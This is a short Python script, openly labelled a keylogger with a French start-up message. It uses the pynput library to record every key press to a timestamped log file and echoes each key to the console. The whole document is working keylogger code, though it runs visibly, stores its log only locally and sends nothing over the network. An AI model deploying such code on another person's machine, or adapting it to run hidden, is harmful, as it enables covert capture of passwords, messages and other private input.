from pynput.keyboard import Listener
import logging

print("\n\tKEYLOGGER en marche!")

file = "log.txt"
logging.basicConfig(filename=file, level=logging.INFO, format="%(asctime)s %(message)s")

def on_press(key):
    logging.info(key)
    print("KEYLOGGER INFO : ", key)

with Listener(on_press=on_press) as listener:
    listener.join()